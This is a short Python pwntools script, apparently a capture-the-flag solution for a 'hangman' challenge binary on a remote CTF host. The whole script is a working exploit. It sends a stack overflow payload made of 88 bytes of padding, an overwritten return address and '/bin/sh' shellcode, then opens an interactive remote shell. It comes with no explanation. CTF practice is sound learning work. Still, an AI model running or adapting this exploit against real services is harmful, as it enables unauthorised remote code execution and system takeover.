from pwn import *

#r = process('./hangman')
r = remote('0.cloud.chals.io', 29170)

context.update(arch='amd64', os='linux')

#pid = gdb.attach(r, gdbscript='''
#        break *main+276
#''')

shellcode = shellcraft.sh()

payload = b'A'*88
payload += p64(0x42669d)
payload += asm(shellcode)

r.sendline(b'2')
r.sendline(payload)
r.interactive()
